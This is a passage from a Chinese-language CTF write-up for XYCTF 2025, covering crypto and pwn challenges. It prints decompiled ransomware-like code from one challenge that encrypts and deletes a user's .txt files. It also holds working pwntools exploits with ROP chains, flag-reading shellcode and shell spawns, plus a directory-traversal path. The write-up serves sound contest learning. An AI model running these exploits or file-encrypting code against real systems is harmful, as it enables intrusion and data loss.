\"w\") as f:\n        f.write(str(e))\n\ndef terms(poly_str):\n    terms = []\n    pattern = r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'\n    matches = re.finditer(pattern, poly_str.replace(' ', ''))\n\n    for match in matches:\n        term = match.group()\n        if term == '+x' or term == 'x':\n            terms.append(1)\n        elif term == '-x':\n            terms.append(-1)\n        elif 'x^' in term:\n            coeff_part = term.split('x^')[0]\n            exponent = int(term.split('x^')[1])\n            if not coeff_part or coeff_part == '+':\n                coeff = 1\n            elif coeff_part == '-':\n                coeff = -1\n            else:\n                coeff = int(coeff_part)\n            terms.append(coeff * exponent)\n        elif 'x' in term:\n            coeff_part = term.split('x')[0]\n            if not coeff_part or coeff_part == '+':\n                terms.append(1)\n            elif coeff_part == '-':\n                terms.append(-1)\n            else:\n                terms.append(int(coeff_part))\n        else:\n            if term == '+1' or term == '1':\n                terms.append(0)\n                terms.append(-0)\n    return terms\n\ndef gen_key(poly_terms):\n    binary = [0] * 128\n    for term in poly_terms:\n        exponent = abs(term)\n        if term > 0 and exponent <= 127:  \n            binary[127 - exponent] = 1\n    binary_str = ''.join(map(str, binary))\n    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)\n    return hex_key\n\ndef read_polynomial_from_file(filename):\n    with open(filename, 'r') as file:\n        return file.read().strip()\n\ndef sm4_encrypt(key, plaintext):\n    assert len(key) == 16, \"SM4 key must be 16 bytes\"\n    cipher = sm4.CryptSM4()\n    cipher.set_key(key, sm4.SM4_ENCRYPT)\n    padded_plaintext = pad(plaintext, 16)\n    return cipher.crypt_ecb(padded_plaintext)\n\ndef sm4_encrypt_file(input_path, output_path, key):\n    with open(input_path, 'rb') as f:\n        plaintext = f.read()\n    \n    ciphertext = sm4_encrypt(key, plaintext)\n    \n    with open(output_path, 'wb') as f:\n        f.write(ciphertext)\n\ndef resource_path(relative_path):\n    if getattr(sys, 'frozen', False):\n        base_path = sys._MEIPASS\n    else:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)\n\ndef encrypt_directory(directory, sm4_key, extensions=[\".txt\"]):\n    if not os.path.exists(directory):\n        print(f\"Directory does not exist: {directory}\")\n        return\n    \n    for root, _, files in os.walk(directory):\n        for file in files:\n            if any(file.endswith(ext) for ext in extensions):\n                input_path = os.path.join(root, file)\n                output_path = input_path + \".enc\"\n                \n                try:\n                    sm4_encrypt_file(input_path, output_path, sm4_key)\n                    os.remove(input_path)\n                    print(f\"Encrypted: {input_path} -> {output_path}\")\n                except Exception as e:\n                    print(f\"Error encrypting {input_path}: {str(e)}\")\n\ndef main():\n    try:\n        save_ntru_keys()\n        poly_str = read_polynomial_from_file(\"priv_key.txt\")\n        poly_terms = terms(poly_str)\n        sm4_key = binascii.unhexlify(poly_terms)\n        user_name = os.getlogin()\n        target_dir = os.path.join(\"C:\\Users\", user_name, \"Desktop\", \"test_files\")\n        \n        if not os.path.exists(target_dir):\n            os.makedirs(target_dir, exist_ok=True)\n            print(f\"Created directory: {target_dir}\")\n            return\n            \n        txt_files = [f for f in os.listdir(target_dir) \n                    if f.endswith('.txt') and os.path.isfile(os.path.join(target_dir, f))]\n        \n        if not txt_files:\n            print(\"No .txt files found in directory\")\n            return\n            \n        for txt_file in txt_files:\n            file_path = os.path.join(target_dir, txt_file)\n            try:\n                with open(file_path, 'rb') as f:\n                    test_data = f.read()\n                \n                ciphertext = sm4_encrypt(sm4_key, test_data)\n                encrypted_path = file_path + '.enc'\n                \n                with open(encrypted_path, 'wb') as f:\n                    f.write(ciphertext)\n            except Exception as e:\n                print(f\"Error processing {txt_file}: {str(e)}\")\n                \n    except Exception as e:\n        print(f\"Fatal error: {str(e)}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n发现将是多项式m转换为SM4密钥加密，p，d=3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。\n\n```python\nfrom gmssl import sm4\nimport binascii\nimport re\n\ndef terms(poly_str):\n    terms = []\n    pattern = r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'\n    matches = re.finditer(pattern, poly_str.replace(' ', ''))\n    \n    for match in matches:\n        print(match)\n        term = match.group()\n        if term == '+x' or term == 'x':\n            terms.append(1)\n        elif term == '-x':\n            terms.append(-1)\n        elif 'x^' in term:\n            coeff_part = term.split('x^')[0]\n            exponent = int(term.split('x^')[1])\n            if not coeff_part or coeff_part == '+':\n                coeff = 1\n            elif coeff_part == '-':\n                coeff = -1\n            else:\n                coeff = int(coeff_part)\n            terms.append(coeff * exponent)\n        elif 'x' in term:\n            coeff_part = term.split('x')[0]\n            if not coeff_part or coeff_part == '+':\n                terms.append(1)\n            elif coeff_part == '-':\n                terms.append(-1)\n            else:\n                terms.append(int(coeff_part))\n        else:\n            if term == '+1' or term == '1':\n                terms.append(0)\n                terms.append(-0)\n    \n    return terms\n\n# 解密函数\ndef sm4_decrypt(key_hex, ciphertext_hex):\n    key = binascii.unhexlify(key_hex)\n    print(len(key))\n    cipher = sm4.CryptSM4()\n    cipher.set_key(key, sm4.SM4_DECRYPT)\n    ciphertext = binascii.unhexlify(ciphertext_hex)\n    print(ciphertext)\n    plaintext = cipher.crypt_ecb(ciphertext)\n    return plaintext\n\ndef sm4_encrypt(key, plaintext):\n    assert len(key) == 16, \"SM4 key must be 16 bytes\"\n    cipher = sm4.CryptSM4()\n    cipher.set_key(key, sm4.SM4_ENCRYPT)\n    padded_plaintext = pad(plaintext, 16)\n    return cipher.crypt_ecb(padded_plaintext)\n\n\nm=\"-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1\"\nm_ = terms(m)\nprint(m_)\n\ndef gen_key(poly_terms):\n    binary = [0] * 128\n    for term in poly_terms:\n        exponent = abs(term)\n        if term > 0 and exponent <= 127:  \n            binary[127 - exponent] = 1\n    binary_str = ''.join(map(str, binary))\n    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)\n    return hex_key\n\nhex_key = gen_key(m_)\nprint(hex_key)\n\nencrypted_flag = \"bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835\"\nflag = sm4_decrypt(hex_key, encrypted_flag)\nprint(\"Decrypted Flag:\", flag)\n```\n\nXYCTF{Crypto0_can_n0t_So1ve_it}\n\n\n\n### reed\n\n题目给出一个基于random的随机数生成器\n\n但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514\n\n有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可\n\n```python\nimport string\nimport random\n\ntable = string.ascii_letters + string.digits\n\nr = random.Random()\n\nclass PRNG:\n    def __init__(self, seed):\n        self.a = 1145140\n        self.b = 19198100\n        random.seed(seed)\n\n    def next(self):\n        x = random.randint(self.a, self.b)\n        random.seed(x ** 2 + 1)\n        return x\n    \n    def round(self, k):\n        for _ in range(k):\n            x = self.next()\n        return x\n\ndef encrypt(msg, a, b):\n    c = [(a * table.index(m) + b) % 19198111 for m in msg]\n    return c\nfrom Crypto.Util.number import *\n\nenc=[10452836, 10452836, 9474070, 15547185, 10452836, 9474070, 6914981, 5936215, 1042385, 841866, 13966862, 10051798, 3978683, 5936215, 17103679, 15146147, 5936215, 9073032, 9073032, 3978683, 13966862, 14945628, 17103679, 12988096, 841866, 2999917, 3978683, 2021151, 9073032, 10452836, 1443423, 10452836, 1443423, 14568419, 10452836, 4379721]\n\nprng = PRNG(0)\n\nflag='114'\n\nencc=enc[0]-enc[2]\ninv_e=inverse(table.index('1')-table.index('4'),19198111)\nprint(inv_e)\n\namod=(enc[0]-enc[2])*inv_e%19198111\nprint(amod)\ninv_a=inverse(amod,19198111)\nprint(inv_a)\nb=enc[0]-amod*table.index('1')%19198111\n\nfor i in enc:\n    print(table[((i-b)*inv_a%19198111)],end='')\n\n\n\n```\n\n114514fixedpointissodangerous1919810\n\n\n\n### choice\n\n```python\nfrom Crypto.Util.number import bytes_to_long\nfrom random import Random\nfrom secret import flag\n\nassert flag.startswith(b'XYCTF{') and flag.endswith(b'}')\nflag = flag[6:-1]\n\nmsg = bytes_to_long(flag)\nrand = Random()\ntest = bytes([i for i in range(255, -1, -1)])\nopen('output.py', 'w').write(f'enc = {msg ^ rand.getrandbits(msg.bit_length())}\\nr = {[rand.choice(test) for _ in range(2496)]}')\n```\n\n给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可\n\nm长度可能与e有偏差，多试两位即可\n\n```python\nfrom Crypto.Util.number import *\nfrom random import *\nfrom tqdm import *\n\n\nwith open(\"/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py\",\"r\") as f:\n    e=int(f.readline().split(\"=\")[1])\n    r=eval(f.read().split(\"=\")[1])\n\ntest = bytes([i for i in range(255, -1, -1)])\n\nDall=[]\nfor i in r:\n    Dall.append(test.index(i))\n\n\nprint(e)\nprint(Dall)\nprint(len(Dall))\nf.close()\n\nn=len(Dall)\nD=Dall\nrng=Random()\n\ndef getRows(rng):\n    #这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。\n    row=[]\n    for i in range(n):\n        row+=list(map(int, (bin(rng.getrandbits(32)>>(32-8))[2:].zfill(8))))\n    return row\nM=[]\n\nfor i in range(19968):#这一部分为固定套路，具体原因已经写在注释中了\n\n    state = [0]*624\n    temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i)\n    for j in range(624):\n        state[j] = int(temp[32*j:32*j+32],2)\n    rng.setstate((3,tuple(state+[624]),None)) #这个setstate也是固定格式，已于2025.1.21测试\n    M.append(getRows(rng))\n\n\nM=Matrix(GF(2),M)\nprint(M.rank())\n\n\ny=[]\nfor i in range(n):\n    y+=list(map(int, (bin(D[i])[2:].zfill(8))))\n\nprint(len(y))\nprint('--------------------------------------------------------------------------------------')\n\ny=vector(GF(2),y)\ns=M.solve_left(y)\n\n\nG=[]\nfor i in range(624):\n    C=0\n    for j in range(32):\n        C<<=1\n        C|=int(s[32*i+j])\n    G.append(C)\n\nimport random\nRNG1 = random.Random()\nfor i in range(624):\n    G[i]=int(G[i])\nprint(G)\n\n\n# G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]\n\nfor i in range(624):\n    G[i]=int(G[i])\n    \n\nimport random\nRNG1 = random.Random()\nRNG1.setstate((int(3),tuple(G+[int(624)]),None))\n\n\nfrom extend_mt19937_predictor import ExtendMT19937Predictor\n\npredictor = ExtendMT19937Predictor()\n\nfor _ in range(624):\n    predictor.setrandbits(RNG1.getrandbits(32), 32)\n\nfor _ in range(624):\n    predictor.backtrack_getrandbits(32)\n    \nkey=predictor.backtrack_getrandbits(e.bit_length()+3)\n\nfrom Crypto.Util.number import *\n\nprint(long_to_bytes(e^^key))\n```\n\n___0h_51mple_r@nd0m___\n\n\n\n### 复复复复数\n\n四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r\n\n但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出\n\n```python\nclass ComComplex:\n    def __init__(self, value=[0,0,0,0]):\n        self.value = value\n    def __str__(self):\n        s = str(self.value[0])\n        for k,i in enumerate(self.value[1:]):\n            if i >= 0:\n                s += '+'\n            s += str(i) +'ijk'[k]\n        return s\n    def __add__(self,x):\n        return ComComplex([i+j for i,j in zip(self.value,x.value)])\n    def __mul__(self,x):\n        a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3]\n        b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2]\n        c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1]\n        d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0]\n        return ComComplex([a,b,c,d])\n    def __mod__(self,x):\n        return ComComplex([i % x for i in self.value])\n    def __pow__(self, x, n=None):\n        tmp = ComComplex(self.value)\n        a = ComComplex([1,0,0,0])\n        while x:\n            if x & 1:\n                a *= tmp\n            tmp *= tmp\n            if n:\n                a %= n\n                tmp %= n\n            x >>= 1\n        return a\n        \n    def inv(l,mod):\n        inv_len=inverse(sum(i**2 for i in l),mod)\n        return ComComplex([l[0]*inv_len%mod,-l[1]*inv_len%mod,-l[2]*inv_len%mod,-l[3]*inv_len%mod])\n\n\nfrom Crypto.Util.number import *\n\nhints = [375413371936,452903063925,418564633198,452841062207]\ngift = [8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729,20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171,22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868,40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863]\nP = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109\nn = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367\nc = ComComplex([212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103,24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825,45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125,96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385])\ne=65547\n\ninv=ComComplex.inv(hints,P)\ngifts=ComComplex(gift)\nkeys=inv*gifts%P\nprint(keys)\n\n_,p,q,r=keys.value\nprint(p*q*r-n)\n\nprint(GCD(e,(p-1)*(q-1)*(r-1)))\nprint(GCD(e,p-1))\nprint(GCD(e,q-1))\nprint(GCD(e,r-1))\n\n\nd=inverse(e,(q**4-q**3-q**2+q)//3)\nm=pow(c,d,q)\n\nfor i in m.value:\n    print(long_to_bytes(i).decode(),end='')\n\n\n\n```\n\nflag{Quaternion_15_ComComComComplexXXX!!!?}\n\n## Pwn\n\n### Ret2libc's Revenge\n\n溢出可以写负数来改返回地址，之后ret2libc就行\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"DEBUG\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nio=remote(\"47.93.96.189\", 36879)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n\tgdb.attach(io, gdbscript=script)\n\n#debug(\"break *0x40127A\")\n#debug()\n\n#target=0x404000-0x20\ntarget=0x4005b0+8-0x20\nrbp=0x040117d\nrsi_0=0x00000000004010e4\nadd_rsi=0x04010eb\nputs=0x404018\nrdi_rsi=0x0401180\nplt=0x0401070\nmain=0x40127B\nret=0x00000000004012a9\n\nnum=0xffffffff-0x12-0xc8\np=\"A\"*(528)+p64(puts)+p32(num)+p32(num)+p64(rbp)+p64(target)+p64(rsi_0)+p64(add_rsi)\np+=p64(rdi_rsi)+p64(plt)+p64(main)\nfor i in range(160):\n\tsl(p)\n\nlibc=u64(ru(\"\\x7f\",False)[-6:].ljust(8, \"\\0\"))-0x21b780\nprint hex(libc)\n\n\nrsi=libc+0x2be51\nrsi_rdx=libc+0x118f2f\nrdi=libc+0x2a3e5\n\nbinsh=libc+0x1d8678\nsystem=libc+0xeb080\nprint hex(system)\n\np=\"A\"*(528+8)+p32(num)+p32(num)+p64(rbp)+p64(0x4040a0)+p64(rdi)+p64(binsh)+p64(rsi)+p64(0)+p64(rsi_rdx)+p64(system)\nsl(p)\nshell()\n```\n\n\n\n### web苦手\n\n两个密码生成的密钥只要最高位为00就可以绕过检测\n\n```python\nimport hashlib\nimport itertools\nimport string\n\nsalt = b\"XYCTF\"\niterations = 1\ndklen = 32\n\ncharset = string.ascii_letters + string.digits  # a-zA-Z0-9\n\nfor length in range(66, 67):\n    for candidate in itertools.product(charset, repeat=length):\n        password = ''.join(candidate).encode()\n        key = hashlib.pbkdf2_hmac(\"sha1\", password, salt, iterations, dklen)\n        if key[0] == 0:\n            print(\"Found password:\", password.decode(errors=\"ignore\"))\n            exit()\n\n#J\n#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2\n\n```\n\n用这两个密码登陆之后目录穿越拿到真的flag\n\n```python\n../../..//flag\n```\n\n### girlfriend\n\n栈迁移打mprotect，之后用openat, mmap, write 读flag\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"DEBUG\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nio=remote(\"47.94.15.198\", 34840)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n    gdb.attach(io, gdbscript=script)\n\n\nsa(\":\",\"3\")\np=\"%7$p-%15$p-%3$p\"\nsa(\"first\", p)\nru(\"name:\\n\")\nleak=ru(\"Y\").split(\"-\")\ncanary=eval(leak[1])\npie=eval(leak[0])-0x18d9\nlibc=eval(leak[2])-0x114887\nprint hex(canary)\nprint hex(pie)\nprint hex(libc)\n\nread=libc+0x1147d0\nret=pie+0x0157B\nrdi=libc+0x2a3e5\nrax=libc+0x45eb0\nrsi=libc+0x02be51\nr12=libc+0x35731\nrdx_r12_r13=libc+0xa80c8\nmprotect=libc+0x11eaa0\ncall=libc+0x29d8e\n\nsa(\":\",\"3\")\n\nrop=\"X\"*0x30+p64(0)\nrop=rop.ljust(0x100, \"X\")\n\nsc=asm(\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag.txt\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\")\n\nrop=\"\"\nrop+=p64(rdi)+p64(pie+0x4000)\nrop+=p64(rsi)+p64(0x2000)\nrop+=p64(rdx_r12_r13)+p64(7)+p64(0)\nrop+=p64(rdx_r12_r13)+p64(7)+p64(0)\nrop+=p64(mprotect)\n#rop+=p64(rdi)+p64(0)\n#rop+=p64(rsi)+p64(pie+0x4000+0x1000)\n#rop+=p64(r12)+p64(0x100)\n#rop+=p64(rdx_r12_r13)+p64(0)*2\n#rop+=p64(read)\nrop+=p64(rax)+p64(pie+0x40d0)\nrop+=p64(call)\nrop+=sc\n\nprint len(rop)\nsa(\"first\", rop)\n\nsla(\"Choice:\", \"1\")\np=\"A\"*56+p64(canary)+p64(pie+0x04060-8)+p64(pie+0x1676)\n#p=\"A\"*56+p64(canary)+\"A\"*8+p64(pie+0x1220)\n#debug()\nsa(\"?\", p)\n\n\nsc=asm(\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\")\n\n\n#debug()\nshell()\n```\n\n\n\n### 明日方舟寻访模拟器\n\n让count变成sh之后传给system，因为输出被关所以把输出道到stderr\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nio=remote(\"47.94.172.18\", 28754)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\n\np=\"A\"*72+p64(0x4018e5)+p64(0x405bcc)+p64(0x04018FC)\n\nsl(\"1\")\n\nsh=0x6873\nwhile sh>10000:\n        sl(\"3\")\n        sl(\"10000\")\n        sl(\"3\")\n        sh-=10000\n\nsl(\"3\")\nsl(\"6739\")\nsl(\"3\")\n\nsl(\"4\")\nsl(\"1\")\n#debug()\ns(p)\n\nsl(\"cat flag 1>&2\")\nshell()\n```\n\n\n\n### EZ 3.0\n\nmips rop\n\n```python\n0x00400a20 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop\n```\n\n这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成/bin/cat flag.txt，t9变成system\n\n\n\n```python\nfrom pwn import *\n\ncontext(arch='mips',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process([\"qemu-mipsel\",\"-g\",\"1234\",\"./ez\"])\nio=remote(\"47.94.15.198\", 